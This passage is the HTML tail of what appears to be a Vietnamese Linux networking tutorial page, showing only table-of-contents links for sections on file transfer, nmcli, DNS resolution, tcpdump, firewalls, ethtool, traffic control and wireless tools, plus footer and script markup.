Traceroute</a></li></ul></li><li><a href=#phần-9-file-transfer-scp-sftp-ftp>PHẦN 9: FILE TRANSFER (SCP, SFTP, FTP)</a><ul><li><a href=#91-so-sánh>9.1 So Sánh</a></li><li><a href=#92-scp>9.2 SCP</a></li><li><a href=#93-sftp>9.3 SFTP</a></li></ul></li><li><a href=#phần-10-networkmanager--nmcli>PHẦN 10: NETWORKMANAGER & NMCLI</a><ul><li><a href=#101-networkmanager-architecture>10.1 NetworkManager Architecture</a></li><li><a href=#102-nmcli-cú-pháp>10.2 nmcli Cú Pháp</a></li><li><a href=#103-xem-trạng-thái>10.3 Xem Trạng Thái</a></li><li><a href=#104-quản-lý-connections>10.4 Quản Lý Connections</a></li><li><a href=#105-quản-lý-devices>10.5 Quản Lý Devices</a></li><li><a href=#106-advanced-bonding-bridge-vlan>10.6 Advanced: Bonding, Bridge, VLAN</a></li><li><a href=#107-troubleshooting>10.7 Troubleshooting</a></li></ul></li><li><a href=#phần-11-dns-resolution---resolvectl--resolvconf>PHẦN 11: DNS RESOLUTION - RESOLVECTL & RESOLVCONF</a><ul><li><a href=#111-dns-resolution-architecture>11.1 DNS Resolution Architecture</a></li><li><a href=#112-etcresolvconf-traditional>11.2 /etc/resolv.conf (Traditional)</a></li><li><a href=#113-resolvconf-legacy-wrapper>11.3 resolvconf (Legacy Wrapper)</a></li><li><a href=#114-systemd-resolved--resolvectl>11.4 systemd-resolved & resolvectl</a></li><li><a href=#115-systemd-resolved-configuration>11.5 systemd-resolved Configuration</a></li><li><a href=#116-dns-over-tls-dot-với-systemd-resolved>11.6 DNS-over-TLS (DoT) với systemd-resolved</a></li></ul></li><li><a href=#phần-12-tcpdump---packet-capture>PHẦN 12: TCPDUMP - PACKET CAPTURE</a><ul><li><a href=#121-packet-capture-fundamentals>12.1 Packet Capture Fundamentals</a></li><li><a href=#122-tcpdump-cú-pháp>12.2 tcpdump Cú Pháp</a></li><li><a href=#123-filter-expressions>12.3 Filter Expressions</a></li><li><a href=#124-practical-examples>12.4 Practical Examples</a></li><li><a href=#125-output-analysis>12.5 Output Analysis</a></li><li><a href=#126-performance-considerations>12.6 Performance Considerations</a></li></ul></li><li><a href=#phần-13-modern-firewalls---firewalld--ufw>PHẦN 13: MODERN FIREWALLS - FIREWALLD & UFW</a><ul><li><a href=#131-iptables-vs-nftables-vs-firewalldufw>13.1 iptables vs nftables vs firewalld/ufw</a></li><li><a href=#132-firewalld-rhelcentosfedora>13.2 firewalld (RHEL/CentOS/Fedora)</a></li><li><a href=#133-ufw-ubuntudebian>13.3 ufw (Ubuntu/Debian)</a></li><li><a href=#134-ufw-application-profiles>13.4 ufw Application Profiles</a></li></ul></li><li><a href=#phần-14-ethtool---nic-configuration>PHẦN 14: ETHTOOL - NIC CONFIGURATION</a><ul><li><a href=#141-nic-information>14.1 NIC Information</a></li><li><a href=#142-nic-configuration>14.2 NIC Configuration</a></li></ul></li><li><a href=#phần-15-tc---traffic-control>PHẦN 15: TC - TRAFFIC CONTROL</a><ul><li><a href=#151-traffic-control-concepts>15.1 Traffic Control Concepts</a></li><li><a href=#152-rate-limiting-với-tbf>15.2 Rate Limiting với tbf</a></li><li><a href=#153-network-emulation-với-netem>15.3 Network Emulation với netem</a></li></ul></li><li><a href=#phần-16-wireless---iw-iwconfig-deprecated>PHẦN 16: WIRELESS - IW (iwconfig DEPRECATED)</a><ul><li><a href=#161-iw-vs-iwconfig>16.1 iw vs iwconfig</a></li><li><a href=#162-wireless-information>16.2 Wireless Information</a></li><li><a href=#163-basic-operations>16.3 Basic Operations</a></li></ul></li><li><a href=#phần-17-legacy-commands-reference>PHẦN 17: LEGACY COMMANDS REFERENCE</a><ul><li><a href=#171-ifconfig-deprecated--ip>17.1 ifconfig (DEPRECATED → ip)</a></li><li><a href=#172-route-deprecated--ip-route>17.2 route (DEPRECATED → ip route)</a></li><li><a href=#173-netstat-deprecated--ss>17.3 netstat (DEPRECATED → ss)</a></li><li><a href=#174-arp-deprecated--ip-neigh>17.4 arp (DEPRECATED → ip neigh)</a></li><li><a href=#175-iwconfig-deprecated--iw>17.5 iwconfig (DEPRECATED → iw)</a></li><li><a href=#176-summary-legacy--modern>17.6 Summary: Legacy → Modern</a></li></ul></li><li><a href=#tóm-tắt-nhanh>TÓM TẮT NHANH</a><ul><li><a href=#ip>ip</a></li><li><a href=#ssnetstat>ss/netstat</a></li><li><a href=#iptables>iptables</a></li><li><a href=#ssh>ssh</a></li><li><a href=#rsync>rsync</a></li><li><a href=#curl>curl</a></li><li><a href=#nmap>nmap</a></li><li><a href=#nc-netcat>nc (netcat)</a></li><li><a href=#digpingtraceroute>dig/ping/traceroute</a></li><li><a href=#nmcli>nmcli</a></li><li><a href=#resolvectl>resolvectl</a></li><li><a href=#tcpdump>tcpdump</a></li><li><a href=#firewall-cmd-rhelcentos>firewall-cmd (RHEL/CentOS)</a></li><li><a href=#ufw-ubuntu>ufw (Ubuntu)</a></li><li><a href=#ethtool>ethtool</a></li><li><a href=#tc-traffic-control>tc (traffic control)</a></li><li><a href=#iw-wireless>iw (wireless)</a></li></ul></li></ul></li></ul></nav></div></div></dialog></main><footer class=footer><div class=footer-container><div class="footer-line powered">Cung cấp bởi <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.152.0"><img class=hugo-icon src=/images/hugo.min.svg alt="Hugo logo"> Hugo</a> | Chủ đề - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.4.0-alpha.2"><img class=fixit-icon src=/images/fixit.min.svg alt="FixIt logo"> FixIt</a></div><div class="footer-line copyright" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2025</span></div></div></footer></div><div class=widgets><div class=fixed-buttons><div class="fixed-button back-to-top animate__faster" role=button aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><svg viewBox="0 0 100 100"><circle class="bg" cx="50" cy="50" r="50"/><circle class="progress" cx="50" cy="50" r="50"/></svg></div><div id=toc-drawer-button class="fixed-button toc-drawer-button" role=button aria-label="Nội dung"><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></div></div><div id=mask></div><div class=reading-progress-bar style=left:0;top:0;--bg-progress:#000;--bg-progress-dark:#fff></div><noscript><div class=noscript-warning>Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div></noscript></div><link rel=stylesheet href=/lib/cookieconsent/cookieconsent.min.css><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/fuse/fuse.min.js defer></script><script src=/lib/instant-page/instantpage.min.js async defer type=module></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/cookieconsent/cookieconsent.min.js defer></script><script src=/lib/pace/pace.min.js async defer></script><script src=/bai-viet/khoa-hoc-may-tinh/linux-cli/network/config/page.js defer></script><script src=/js/theme.min.js defer></script></body></html>